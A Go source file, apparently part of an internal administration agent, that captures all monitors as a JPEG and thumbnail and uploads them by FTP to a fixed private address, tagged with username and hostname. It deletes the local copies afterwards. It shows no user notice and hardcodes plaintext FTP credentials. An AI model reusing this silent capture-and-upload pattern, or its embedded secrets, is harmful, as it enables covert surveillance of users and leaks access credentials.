// screenshot.go
package scripts

import (
	"errors"
	"fmt"
	"image"
	"image/jpeg"
	"io/ioutil"
	"os"
	"path/filepath"
	"time"

	"github.com/kbinani/screenshot"
	"golang.org/x/image/draw"
)

// -----------------------------
// Tipos
// -----------------------------

// ScreenshotData representa o resultado da captura de tela
type ScreenshotData struct {
	Username              string `json:"username"`
	Hostname              string `json:"hostname"`
	ScreenshotPath        string `json:"screenshot_path"`
	ScreenshotThumbPath   string `json:"screenshot_thumb_path"`
	FTPScreenshotURI      string `json:"ftp_screenshot_uri,omitempty"`
	FTPThumbURI           string `json:"ftp_thumb_uri,omitempty"`
	FTPDirectoryStructure string `json:"ftp_directory_structure"`
	CaptureTime           string `json:"capture_time"`
	MonitorCount          int    `json:"monitor_count"`
	CompressionType       string `json:"compression_type"`
	FileSizeBytes         int64  `json:"file_size_bytes"`
	FTPUploadSuccess      bool   `json:"ftp_upload_success"`
	FTPServer             string `json:"ftp_server"`
}

// ScreenshotScript implementa a interface Script
type ScreenshotScript struct {
	ftpServer   string
	ftpUser     string
	ftpPass     string
	localTemp   string
	jpegQuality int
	thumbScale  float64
}

// NewScreenshotScript cria uma nova instância com configurações
func NewScreenshotScript(ftpServer, ftpUser, ftpPass string) *ScreenshotScript {
	if ftpServer == "" {
		ftpServer = "172.20.29.199"
	}
	if ftpUser == "" {
		ftpUser = "steel"
	}
	if ftpPass == "" {
		ftpPass = "M7a64tl0"
	}

	return &ScreenshotScript{
		ftpServer:   ftpServer,
		ftpUser:     ftpUser,
		ftpPass:     ftpPass,
		localTemp:   `C:\temp`,
		jpegQuality: 85,
		thumbScale:  0.3,
	}
}

func (s *ScreenshotScript) Name() string {
	return "screenshot"
}

func (s *ScreenshotScript) Execute(args ...string) ([]map[string]interface{}, error) {
	// Executar captura de tela
	data, err := s.captureScreen()
	if err != nil {
		hostname, _ := os.Hostname()
		return []map[string]interface{}{
			{
				"hostname": hostname,
				"error":    err.Error(),
				"status":   "error",
			},
		}, err
	}

	// Converter para map[string]interface{}
	result := map[string]interface{}{
		"username":                data.Username,
		"hostname":                data.Hostname,
		"screenshot_path":         data.ScreenshotPath,
		"screenshot_thumb_path":   data.ScreenshotThumbPath,
		"ftp_screenshot_uri":      data.FTPScreenshotURI,
		"ftp_thumb_uri":           data.FTPThumbURI,
		"ftp_directory_structure": data.FTPDirectoryStructure,
		"capture_time":            data.CaptureTime,
		"monitor_count":           data.MonitorCount,
		"compression_type":        data.CompressionType,
		"file_size_bytes":         data.FileSizeBytes,
		"ftp_upload_success":      data.FTPUploadSuccess,
		"ftp_server":              data.FTPServer,
	}

	return []map[string]interface{}{result}, nil
}

func (s *ScreenshotScript) captureScreen() (*ScreenshotData, error) {
	// Obter informações do sistema
	hostname, _ := os.Hostname()
	username := GetFullUsername()

	// Preparar caminhos
	if err := os.MkdirAll(s.localTemp, 0755); err != nil {
		return nil, fmt.Errorf("erro criando temp: %w", err)
	}

	timestamp := time.Now().Format("2006-01-02_15-04-05")
	screenshotPath := filepath.Join(s.localTemp, fmt.Sprintf("screenshot_%s.jpg", timestamp))
	screenshotThumbPath := filepath.Join(s.localTemp, fmt.Sprintf("screenshot_%s_thumb.jpg", timestamp))

	// Captura de tela: calcular virtual bounds (todos os monitores juntos)
	numDisplays := screenshot.NumActiveDisplays()
	if numDisplays == 0 {
		return nil, errors.New("nenhum display ativo encontrado")
	}

	bounds := screenshot.GetDisplayBounds(0)
	for i := 1; i < numDisplays; i++ {
		r := screenshot.GetDisplayBounds(i)
		bounds = bounds.Union(r)
	}

	// Capturar imagem
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return nil, fmt.Errorf("erro capturando tela: %w", err)
	}

	// Salvar JPEG com qualidade configurada
	if err := saveJpegWithQuality(screenshotPath, img, s.jpegQuality); err != nil {
		return nil, fmt.Errorf("erro salvando screenshot: %w", err)
	}

	// Criar thumbnail
	thumb := scaleImage(img, s.thumbScale)
	_ = saveJpegWithQuality(screenshotThumbPath, thumb, s.jpegQuality)

	// FTP: criar diretórios
	ftpMainDir := "/ftp/"
	ftpHostDir := fmt.Sprintf("/ftp/%s/", hostname)

	_ = ftpMakeDirIfNotExists(s.ftpServer, s.ftpUser, s.ftpPass, ftpMainDir)
	_ = ftpMakeDirIfNotExists(s.ftpServer, s.ftpUser, s.ftpPass, ftpHostDir)

	// Caminhos remotos para upload
	ftpScreenshotRemote := fmt.Sprintf("/ftp/%s/%s", hostname, filepath.Base(screenshotPath))
	ftpThumbRemote := fmt.Sprintf("/ftp/%s/%s", hostname, filepath.Base(screenshotThumbPath))

	// Ler arquivos locais
	screenshotBytes, err := ioutil.ReadFile(screenshotPath)
	if err != nil {
		return nil, fmt.Errorf("erro lendo screenshot local: %w", err)
	}

	thumbBytes, _ := ioutil.ReadFile(screenshotThumbPath)

	// Upload para FTP
	err1 := ftpUploadFile(s.ftpServer, s.ftpUser, s.ftpPass, ftpScreenshotRemote, screenshotBytes)

	err2 := error(nil)
	if len(thumbBytes) > 0 {
		err2 = ftpUploadFile(s.ftpServer, s.ftpUser, s.ftpPass, ftpThumbRemote, thumbBytes)
	}

	screenshotSuccess := (err1 == nil)
	thumbSuccess := (err2 == nil || len(thumbBytes) == 0)

	// Obter tamanho do arquivo
	info, _ := os.Stat(screenshotPath)
	size := int64(0)
	if info != nil {
		size = info.Size()
	}

	// Criar resultado
	data := &ScreenshotData{
		Username:              username,
		Hostname:              hostname,
		ScreenshotPath:        screenshotPath,
		ScreenshotThumbPath:   screenshotThumbPath,
		FTPScreenshotURI:      "",
		FTPThumbURI:           "",
		FTPDirectoryStructure: ftpHostDir,
		CaptureTime:           time.Now().Format("2006-01-02T15:04:05"),
		MonitorCount:          numDisplays,
		CompressionType:       "jpeg",
		FileSizeBytes:         size,
		FTPUploadSuccess:      screenshotSuccess && thumbSuccess,
		FTPServer:             s.ftpServer,
	}

	// Montar URIs completos apenas se upload foi bem-sucedido
	if screenshotSuccess {
		data.FTPScreenshotURI = fmt.Sprintf("ftp://%s%s", s.ftpServer, ftpScreenshotRemote)
	}
	if thumbSuccess && len(thumbBytes) > 0 {
		data.FTPThumbURI = fmt.Sprintf("ftp://%s%s", s.ftpServer, ftpThumbRemote)
	}

	// Cleanup se upload foi bem-sucedido
	if screenshotSuccess && thumbSuccess {
		_ = os.Remove(screenshotPath)
		_ = os.Remove(screenshotThumbPath)
	}

	return data, nil
}

// -----------------------------
// Utilidades imagem
// -----------------------------
func saveJpegWithQuality(path string, img image.Image, quality int) error {
	out, err := os.Create(path)
	if err != nil {
		return err
	}
	defer out.Close()
	opts := &jpeg.Options{Quality: quality}
	return jpeg.Encode(out, img, opts)
}

func scaleImage(src image.Image, scale float64) image.Image {
	sw := int(float64(src.Bounds().Dx()) * scale)
	sh := int(float64(src.Bounds().Dy()) * scale)
	if sw <= 0 {
		sw = 1
	}
	if sh <= 0 {
		sh = 1
	}
	dst := image.NewRGBA(image.Rect(0, 0, sw, sh))
	draw.CatmullRom.Scale(dst, dst.Bounds(), src, src.Bounds(), draw.Over, nil)
	return dst
}
